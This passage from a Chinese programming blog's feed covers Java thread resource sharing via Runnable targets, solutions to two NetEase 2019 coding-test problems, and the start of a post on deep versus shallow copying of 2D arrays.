public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-3卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br></code></pre></td></tr></table></figure><p>我用这个继承了Thread的类创建了一个对象，然后用它再去创建三个线程，实现了资源共享。证明我的想法没有错，不能资源共享并不是因为它是继承了Thread类。而是因为创建这三个线程的方式。那到底是为什么会造成这种现象呢。<br>两种方式的区别也只有：</p><ul><li>一个是用Thread的无参构造方法构造了三个Thread。</li><li>一个是用Thread的有参构造方法构造了三个Thread。</li></ul><p>于是按ctrl+左键去看看Thread类，发现了这些东西</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>    &#x2F;* For autonumbering anonymous threads. *&#x2F;<br>    private static int threadInitNumber;<br>    &#x2F;* What will be run. *&#x2F;<br>    private Runnable target;<br>&#x2F;&#x2F;...<br>&#x2F;**<br>     * If this thread was constructed using a separate<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; run object, then that<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; object&#39;s &lt;code&gt;run&lt;&#x2F;code&gt; method is called;<br>     * otherwise, this method does nothing and returns.<br>     * &lt;p&gt;<br>     * Subclasses of &lt;code&gt;Thread&lt;&#x2F;code&gt; should override this method.<br>     *<br>     * @see     #start()<br>     * @see     #stop()<br>     * @see     #Thread(ThreadGroup, Runnable, String)<br>     *&#x2F;<br>    @Override<br>    public void run() &#123;<br>        if (target !&#x3D; null) &#123;<br>            target.run();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是找到了造成以上三个程序结果的原因：</p><ul><li>注释中的What will be run 是一个 名为target的实现了Runnable接口的对象 。用有参(有target)构造函数构造一个Thread，该线程的run()方法即执行target的run()方法。如果用有参构造函数创建三个线程，并且传入的是同一个实现了Runnable接口的对象，那么这三个线程中的target指向同一个对象。所以这三个线程的对同一个对象进行操作，从而实现资源共享的效果。</li><li>第二个程序用无参构造函数创建线程，则这个target为空，执行Thread本身的run()方法，而这个Thread继承了一个Thread，并重写过run()方法。执行的就是重写过的run()方法。我们创建三个这样的对象，是分别执行每个对象中的run()方法。所以并不能资源共享。</li><li>而第三个程序虽然使用继承的方法重写了Thread的run()方法，但是并没有将这个Thread直接用new实例化来使用。而是用它作为一个Runnable target，重新创建了三个target相同的Thread对象。相当于用继承Thread重写run()方法的方式，来间接地实现Runnable接口= =，然后再创建线程。</li></ul><p>为了再次验证这个想法，我们去找Thread的构造函数。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*找到了一大堆构造函数，只贴这两个了- -<br>*&#x2F;<br>public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>public Thread() &#123;<br>        init(null, null, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>public Thread(Runnable target) &#123;<br>        init(null, target, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>&#x2F;&#x2F;...<br>&#125;<br></code></pre></td></tr></table></figure><p>发现构造方法其实在用尽可能多的信息去填充init()这个方法的参数，如果没有就填null。<br>（顺便发现线程名称是“Thread-”再加一个数字，这个数字是threadInitNumber++。刚好解释了为什么我们的第三个程序的线程名是从1开始而不是从0开始。因为0被我们创建的第一个Thread占用了）<br>那我们看看init方法的实现</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize) &#123;<br>        init(g, target, name, stackSize, null, true);<br>    &#125;<br></code></pre></td></tr></table></figure><p>emmm,它用同样的方式调用了一个参数更全的init方法。于是我们找到了Thread线程构造方法的核心部分。发现构造函数的target正是赋值给了run()方法执行的target。证明了之前的想法。<br>所以说<b>资源共享的本质是，多个线程调用同一个对象的run()方法。</b>那么我们的问题已经有了答案。<br>但来都来了，顺便瞧一下构造一个Thread最多都需要哪些参数吧。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>     * Initializes a Thread.<br>     *<br>     * @param g the Thread group<br>     * @param target the object whose run() method gets called<br>     * @param name the name of the new Thread<br>     * @param stackSize the desired stack size for the new thread, or<br>     *        zero to indicate that this parameter is to be ignored.<br>     * @param acc the AccessControlContext to inherit, or<br>     *            AccessController.getContext() if null<br>     * @param inheritThreadLocals if &#123;@code true&#125;, inherit initial values for<br>     *            inheritable thread-locals from the constructing thread<br>     *&#x2F;<br>    private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize, AccessControlContext acc,<br>                      boolean inheritThreadLocals) &#123;<br>       &#x2F;&#x2F;...<br>       &#x2F;&#x2F;当然要包含这句<br>        this.target &#x3D; target;<br>       &#x2F;&#x2F;...<br>    &#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th align="left">含义</th></tr></thead><tbody><tr><td>ThreadGroup g</td><td align="left">设置这个线程的线程组</td></tr><tr><td>Runnable target</td><td align="left">这个线程要执行操作的对象，run()所在的对象。</td></tr><tr><td>String name</td><td align="left">设置线程名</td></tr><tr><td>long stackSize</td><td align="left">设定线程栈的大小，就是这个线程在JVM里栈的大小。</td></tr><tr><td>AccessControlContext acc</td><td align="left">权限控制上下文，不是很懂–<a href="https://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/" target="_blank" rel="noopener">Java安全模型</a></td></tr><tr><td>boolean inheritThreadLocals</td><td align="left">可继承的ThreadLocal</td></tr></tbody></table><p>又看了看Thread的start方法，发现Thread的start方法调用了一个名为start0的本地方法。<br>而该Thread的run()法执行target的run()方法。所以要执行这个线程.run()也就是执行了target.run()。不过并没有新建真正的线程，只是执行了这个方法而已。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：瞌睡</title>
      <link href="/posts/8a6c894b.html"/>
      <url>/posts/8a6c894b.html</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小易觉得高数课太无聊了，决定睡觉。不过他对课上的一些内容挺感兴趣，所以希望你在老师讲到有趣的部分的时候叫醒他一下。你知道了小易对一堂课每分钟知识点的感兴趣程度，并以分数量化，以及他在这堂课上每分钟是否会睡着，你可以叫醒他一次，这会使得他在接下来的k分钟内保持清醒。你需要选择一种方案最大化小易这堂课听到的知识点分值。</p><a id="more"></a><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><p>第一行 n, k (1 &lt;= n, k &lt;= 105) ，表示这堂课持续多少分钟，以及叫醒小易一次使他能够保持清醒的时间。<br>第二行 n 个数，a1, a2, … , an(1 &lt;= ai &lt;= 104) 表示小易对每分钟知识点的感兴趣评分。<br>第三行 n 个数，t1, t2, … , tn 表示每分钟小易是否清醒, 1表示清醒。</p><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><p>小易这堂课听到的知识点的最大兴趣值。</p><p>示例<br>输入</p><p>6 3<br>1 3 5 2 5 4<br>1 1 0 1 0 0<br>1<br>2<br>3<br>输出</p><p>16</p><h3 id="最初解题思路"><a href="#最初解题思路" class="headerlink" title="最初解题思路"></a>最初解题思路</h3><ol><li>把兴趣值和是否醒着储存到一个二维数组。</li><li>复制这个二维数组，按顺序修改数组，模拟每次被叫醒的状态，统计总兴趣值。</li><li>找出总兴趣值中的最大值，输出。</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>&#x2F;&#x2F;用于储存每种叫醒情况的总兴趣值<br>        int[] scores&#x3D;new int[n];<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>        &#x2F;&#x2F;克隆原数组<br>            int scoremapClone[][] &#x3D; new int[scoremap.length][];<br>            for(int j&#x3D;0;j&lt;scoremap.length;j++)&#123;<br>                scoremapClone[j]&#x3D;scoremap[j].clone();<br>            &#125;<br>            &#x2F;&#x2F;模拟叫醒<br>            for(int j&#x3D;0;j&lt;k;j++)&#123;<br>                if(i+j&lt;n)&#123;<br>                    scoremapClone[i+j][0]&#x3D;1;<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;计算总兴趣值，并储存<br>            for(int j&#x3D;0;j&lt;n;j++)&#123;<br>                if(scoremapClone[j][0]&#x3D;&#x3D;1)&#123;<br>                    scores[i]+&#x3D;scoremapClone[j][1];<br>                &#125;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;找出最大值<br>        int max &#x3D; Arrays.stream(scores).max().getAsInt();<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/posts/8a6c894b/09/11/【编程题】网易2019笔试：瞌睡/真叫人头大.jpg" alt style="width:100px;height:100px" align="right"><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>AC 0.5 ，运行超时。<br>反思：克隆数组花费了大量时间，其实可以不模拟每次修改后的状态，只做实时运算。于是对代码做出改进。<br>其实每次的运算结果也不用都保存起来，最后再取最大值。只要保存一个当前最大值就可以了。</p><h3 id="改进版思路"><a href="#改进版思路" class="headerlink" title="改进版思路"></a>改进版思路</h3><p>把兴趣值和是否醒着储存到一个二维数组。<br>实时计算每次叫醒可以获得的兴趣值，如果大于max（初始化为0）则储存到max。<br>加上固定兴趣值，输出结果。</p><h3 id="改进版代码"><a href="#改进版代码" class="headerlink" title="改进版代码"></a>改进版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n&#x3D; sc.nextInt();<br>        int k&#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n&amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;加上固定兴趣值成为总兴趣值<br>        for(int j&#x3D;0;j&lt;n;j++)&#123;<br>            if(scoremap[j][0]&#x3D;&#x3D;1)&#123;<br>                max+&#x3D;scoremap[j][1];<br>            &#125;<br>        &#125;<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>AC 0.9 ，运行超时！！！<br><img src="/posts/8a6c894b/09/11/【编程题】网易2019笔试：瞌睡/嗯.jpg" alt style="width:110px;height:100px"><br>WTF!!!容老夫再想想。<br><img src="/posts/8a6c894b/09/11/【编程题】网易2019笔试：瞌睡/盲目分析.jpg" alt style="width:100px;height:100px"><br>想到的优化方式：</p><ol><li>计算固定兴趣值这部分，其实可以在输入的同时计算，这样就少一个次数为N的循环。<br>（结果改了这个还是AC 0.9,于是又做出了下面的改进）</li><li>当宽度为n的滑动窗口超出k的范围时，所得到的兴趣值会逐渐减少。所以可以取消循环中（i&gt;n-k+1）这部分。</li></ol><h3 id="最终版思路"><a href="#最终版思路" class="headerlink" title="最终版思路"></a>最终版思路</h3><p>其实和上面是一样的，不过从代码逻辑上和思路逻辑上分别减少了一些多余的操作。</p><h3 id="最终版代码"><a href="#最终版代码" class="headerlink" title="最终版代码"></a>最终版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        &#x2F;&#x2F;最大兴趣值<br>        int stable &#x3D; 0;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;在输入的同时储存固定兴趣值到max<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>            if(scoremap[i][0]&#x3D;&#x3D;1)&#123;<br>                stable+&#x3D;scoremap[i][1];<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n-k+1;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n &amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        System.out.println(max+stable);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>AC 1.0。 NICE，此题完结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>想想自己写的那个最初版代码真是<br><img src="/posts/8a6c894b/09/11/【编程题】网易2019笔试：瞌睡/写的什么垃圾.jpg" alt style="width:110px;height:100px"></p><ul><li>遇到题目不要总想着暴力破解。即使计算机性能强大，但实际上，当遇到某些输入量较大并且时间复杂度- 较高的程序，运行时间会明显增加。</li><li>一定尽量避免重复或者无效代码，可以实时运算的部分就不要占用储存空间。</li><li>对程序尽可能的优化，任意一点优化都可能对结果产生影响。</li><li>看到题目先在纸上画图分析一遍，对整理思路非常有帮助！</li><li>Java8中引入了Stream的概念，对于基本数值型，目前有三种对应的包装类型 Stream：IntStream、LongStream、DoubleStream。用Arrays.stream()方法可以获得一个Stream,本题第一个程序中使用了Stream.max()方法。关于Stream的更多使用可以看<a href="http://www.runoob.com/java/java8-streams.html" target="_blank" rel="noopener">这里</a>。给自己挖个坑= =</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：牛牛找工作</title>
      <link href="/posts/438207b5.html"/>
      <url>/posts/438207b5.html</url>
      
        <content type="html"><![CDATA[<p>做了很多次笔试，编程题总是不能在规定时间内完成。一个原因是算法图的部分没有看。还有一个原因是题做得太少。今天开始打算有空的时候整理一下做过的编程题。总结一下知识点，也对自己的做题历程做一个记录。。。</p><a id="more"></a><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。<br>输入描述:<br>每个输入包含一个测试用例。<br>每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。<br>接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。<br>接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。<br>保证不存在两项工作的报酬相同。</p><p>输出描述:<br>对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。<br>示例1<br>输入<br>3 3<br>1 100<br>10 1000<br>1000000000 1001<br>9 10 1000000000<br>输出<br>100<br>1000<br>1001</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>首先将工作难度和对应薪资储存在二维数组，按能力要求增序排序。</li><li>排序后需要更新每个难度下的薪资为 可获得的最大值(因为可能存在能力要求高的工作薪资反而低的情况)。</li><li>用二分查找确定能胜任的最大工作难度及其最大报酬。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br>public class Main &#123;<br>    public static void main(String[] args)&#123;<br>        Scanner scanner &#x3D; new Scanner(System.in);<br>        int N&#x3D;scanner.nextInt();<br>        int M&#x3D;scanner.nextInt();<br>        int[][] jobmap&#x3D; new int[N][2];<br>        for(int i&#x3D;0;i&lt;N;i++)&#123;<br>            jobmap[i][0]&#x3D;scanner.nextInt();<br>            jobmap[i][1]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;将 薪资-能力 二维数组按能力要求增序排序<br>        Arrays.sort(jobmap,(int[] o1, int[] o2) -&gt;  o1[0]-o2[0]);<br>        &#x2F;&#x2F;排序后需要更新每个ability下的薪资为 可获得的最大值(如果低能力要职位的求薪资高于高能力要求职位的薪资，则更新高能力要求职位的薪资为高薪资)<br>        for (int i &#x3D; 0; i &lt; jobmap.length - 1; i++) &#123;<br>            if (jobmap[i][1] &gt; jobmap[i + 1][1]) &#123;<br>                jobmap[i + 1][1] &#x3D; jobmap[i][1];<br>            &#125;<br>        &#125;<br>        int[] people &#x3D; new int[M];<br>        for(int i&#x3D;0;i&lt;M;i++)&#123;<br>            people[i]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F; 二分查找确定能胜任的最大工作难度及其最大报酬<br>        for (int i &#x3D; 0; i &lt; people.length; i++) &#123;<br>            int index &#x3D; Arrays.binarySearch(jobmap, new int[] &#123;people[i], 0&#125;, (int[] jd1, int[] jd2) -&gt;jd1[0] - jd2[0]);<br>            index &#x3D; index &lt; 0 ? -(index + 1) - 1: index;<br>            System.out.println(index &gt;&#x3D; 0 ? jobmap[index][1] : 0);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>在初次编写代码的时候没有考虑到不一定报酬和工作难度都成正比。考虑不周全，需要注意。</li><li>在初次编写代码的时候，每个人都对所有工作进行遍历查找一次，时间复杂度为O(n²)。在数据量较大时性能不高，导致超时。改为二分查找后时间复杂度为O(log2(n))。</li><li>在使用Arrays.sort(T[] a, Comparator&lt;? super T&gt; c)方法时,使用了lambda表达式替代了匿名内部类。注意返回参数一减参数二的值是增序。</li><li>在使用Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)时也使用了lambda表达式，在使用该方法前需要先使用sort方法排序。当查询的Key存在时，这个方法返回key在该数组中的下标，否则返回(-(insertion point) - 1)，insertion point指的是key在这个数组中应该插入的位置。也就是第一个比key大的值的下标，当key比所有值都大的时候，返回数组长度。所以当且仅当查找到key时，该方法的返回值才是正数。所以我们要寻找的最大报酬的工作的下标为 -(index + 1) - 1。</li></ul><blockquote><p>Java API中对Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)返回值的描述</p></blockquote><p>index of the search key, if it is contained in the array; otherwise, (-(insertion point) - 1). The insertion point is defined as the point at which the key would be inserted into the array: the index of the first element greater than the key, or a.length if all elements in the array are less than the specified key. Note that this guarantees that the return value will be &gt;= 0 if and only if the key is found.</p>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我翻译的文章在这里</title>
      <link href="/posts/61121.html"/>
      <url>/posts/61121.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/user/1206354/articles" target="_blank" rel="noopener">这里是我腾讯云+社区的个人中心</a>，里面有我翻译的几篇文章。<br>虽然并不是专业的翻译，不过收到赞和关注的时候还是小有成就感&gt;&lt;。</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中二维数组的复制（深拷贝与浅拷贝）</title>
      <link href="/posts/65304.html"/>
      <url>/posts/65304.html</url>
      
        <content type="html"><![CDATA[<p>最近在做一道编程题的时候出现了一处bug。在这道题需要使用多种方法对同一个二维数组进行更改，找出使第二列数之和最大的更改方法。所以每次修改之前，我对原数组进行拷贝，修改的是数组的拷贝。可是程序写完之后，运行结果却出乎意料的是错误的。看了几遍程序流程，觉得逻辑上没有错误。于是打开debug模式一步步看数值变化。调试时发现在第二次循环中，数组本该为0的位置，值却被改成了1,而这是第一次进行修改的结果。此时顿悟，想起很久之前学过的深拷贝和浅拷贝，绝对是clone()的问题。</p><a id="more"></a><p>我们重现一下当时的问题，上代码：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class cloneTeset &#123;<br>    public static void main(String[] args) &#123;<br>        int a[][] &#x3D; &#123;&#123;0,0,0&#125;,&#123;1,1,1&#125;,&#123;2,2,2&#125;&#125;;<br>        int b[][] &#x3D; a.clone();<br>        b[1][1]&#x3D;3;<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(a[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>        System.out.println();<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(b[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果是</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 3 1  2 2 2  <br>0 0 0  1 3 1  2 2 